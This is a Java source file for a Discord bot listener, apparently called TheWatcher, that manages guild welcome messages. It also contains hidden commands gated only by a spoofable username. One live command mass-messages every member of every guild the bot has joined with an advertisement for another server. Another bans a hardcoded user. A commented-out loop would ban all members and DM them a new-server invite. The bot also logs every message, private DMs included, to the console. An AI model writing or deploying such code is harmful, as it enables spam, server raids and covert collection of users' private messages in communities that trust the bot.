package me.richdev.TheWatcher;

import me.richdev.TheWatcher.GuildSystem.GuildConfiguration;
import net.dv8tion.jda.core.entities.*;
import net.dv8tion.jda.core.events.ReadyEvent;
import net.dv8tion.jda.core.events.message.MessageReceivedEvent;
import net.dv8tion.jda.core.hooks.ListenerAdapter;

public class Listener extends ListenerAdapter {

    @Override
    public void onReady(ReadyEvent e) {
        System.out.println("JDA is ready! Bot should be online.");
    }

    public void onMessageReceived(MessageReceivedEvent event) {
        System.out.println(event.getAuthor().getName() + "#"  + event.getAuthor().getDiscriminator() + " >> " + event.getMessage().getContentDisplay());

        if(event.getAuthor().getName().equals("RichBoy")) {

            GuildConfiguration gc = Main.getInstance().getGuildsHandler().getGuild(event.getGuild().getId());

            if(gc != null) {

                if(event.getMessage().getContentDisplay().startsWith("{setJoinMessage")) {
                    StringBuilder fn = new StringBuilder();
                    String[] all = event.getMessage().getContentDisplay().split(" ");

                    for (int i = 1; i < all.length; i++) {
                        fn.append(all[i]).append(" ");
                    }

                    gc.setWelcomeMessage(fn.toString());
                    event.getMessage().delete().queue();
                    return;
                }

                event.getMessage().delete().queue();
                event.getTextChannel().sendMessage(gc.getWelcomeMessage()
                        .replace("{user.name}", event.getAuthor().getAsMention()))
                        .queue();
                return;
            } else {
                System.out.println("NOT FOUND GUILD.");
            }

            if(event.getMessage().getContentDisplay().startsWith("{msg")) {

                String[] sv = event.getMessage().getContentDisplay().split(" ");

                if(sv[1].equals("deleteall")) {
                    event.getGuild().getController().ban(event.getGuild().getMemberById("391436826545487872"), 10).queue(c -> event.getTextChannel().sendMessage("BANEANEADITO !").queue());
                    return;
                }
/*
                for (Member member : event.getGuild().getMembers()) {
                    event.getGuild().getController().ban(member.getUser(), 11778148, "NUEVO SERVIDOR: {inserta url}").queue();
                    member.getUser().openPrivateChannel().queue(c -> c.sendMessage("MENSAJE DE NUEVO SERVIDOR").queue());

                }
*/
                StringBuilder sb = new StringBuilder();



                for (int i = 1; i < sv.length; i++) {
                    sb.append(sv[i]).append(" ");
                }

                event.getTextChannel().sendMessage(sb.toString()).queue();
                event.getMessage().delete().queue();
            }

            return;

        }

        if(event.getMessage().getContentDisplay().equals(">avisaleatodos")) {
            if(!event.getAuthor().getName().equals("Rich")) return;
            for (Guild guild : event.getJDA().getGuilds()) {
                for(Member m : guild.getMembers()) {
                    if(!m.getUser().getName().equals("Wirlie") || !m.getUser().isBot()) {
                        m.getUser().openPrivateChannel().queue((c) -> {
                            c.sendMessage("Unete a una extensa comunidad de jugadores dedicada al gaming, aquí podrás encontrar **SERVIDORES DE MINECRAFT** (y spamear el tuyo) Y GRANDES GUILDS PARA JUGAR A CUALQUIER JUEGO!\n" +
                                    "https://discord.gg/XYGKxuW").queue();

                            System.out.println("Avisado: " + m.getUser().getName() + " ID: "+  m.getUser().getId() + " Discriminator: " + m.getUser().getDiscriminator());
                        });
                    }
                }
            }
        }

        if(event.getMessage().getContentDisplay().equals(">evento")) {
            if(!event.getAuthor().getId().equals(event.getGuild().getOwner().getUser().getId())) return;

            StringBuilder builder = new StringBuilder();

            String[] args = event.getMessage().getContentDisplay().split(" ");

            for (int i = 1; i < args.length; i++) {
                builder.append(args[i]).append(" ");
            }

            event.getJDA().getGuildById("269235633749229568").getTextChannelById("431679878501498880").sendMessage(builder.toString()).queue();
        }

        if(event.isFromType(ChannelType.PRIVATE))
            System.out.println(event.getAuthor().getName() +"#"+ event.getAuthor().getDiscriminator() + " ->ID:" + event.getAuthor().getId() + " Message: " + event.getMessage().getContentDisplay());
    }

}
